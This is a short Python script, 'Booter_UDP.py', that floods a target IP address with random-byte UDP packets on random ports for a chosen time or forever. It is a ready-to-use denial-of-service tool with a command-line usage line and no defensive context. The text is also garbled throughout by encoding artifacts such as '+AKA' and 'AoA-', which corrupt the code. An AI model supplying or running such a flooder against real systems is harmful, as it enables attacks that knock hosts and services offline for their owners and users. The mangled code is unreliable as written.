#!/usr/bin/env python
# encoding: utf-8
"""
Booter_UDP.py

Created by Author Name on 6/9/18.
Copyright (c) 2018 Copyright Holder. All rights reserved.
"""



+AKA

import+AKA-socket,random,sys,time

+AKA

if+AKA-len(sys.argv)+AKA!=+AKA-4:

+AKA +AKA +AKA +AKAAoA-print("Usage: %s <Target IP> <Packet Size (MAX 65500)> <Duration Time (0 = forever)>"+AKA%+AKA-sys.argv[0])

+AKA +AKA +AKA +AKAAoA-sys.exit(1)

+AKA

qIP+AKA=+AKA-sys.argv[1]

qPSize+AKA=+AKA-int(sys.argv[2])

qDuration+AKA=+AKA-int(sys.argv[3])

+AKA

qClock+AKA=+AKA(lambda:0,+AKA-time.clock)[qDuration+AKA>+AKA-0]

qDuration+AKA=+AKA(1,+AKA(qClock()+AKAAKw qDuration))[qDuration+AKA>+AKA-0]

+AKA

qPacket+AKA=+AKA-random._urandom(qPSize)

qSocket+AKA=+AKA-socket.socket(socket.AF_INET,+AKA-socket.SOCK_DGRAM)

+AKA

print("[Starting UDP Flood on %s with %s bytes for %s seconds]"+AKA%+AKA(qIP,+AKA-qPSize,+AKA-qDuration+AKA-or+AKA'Infinite'))

+AKA

while+AKA-True:

+AKA +AKA +AKA +AKAAoA-if+AKA(qClock()+AKA<+AKA-qDuration):

+AKA +AKA +AKA +AKA +AKA +AKA +AKA +AKA qPort+AKA=+AKA-random.randint(1,+AKA-65535)

+AKA +AKA +AKA +AKA +AKA +AKA +AKA +AKA qSocket.sendto(qPacket,+AKA(qIP,+AKA-qPort))

+AKA +AKA +AKA +AKAAoA-else:

+AKA +AKA +AKA +AKA +AKA +AKA +AKA +AKAAoA-break

+AKA

print("DONE!")

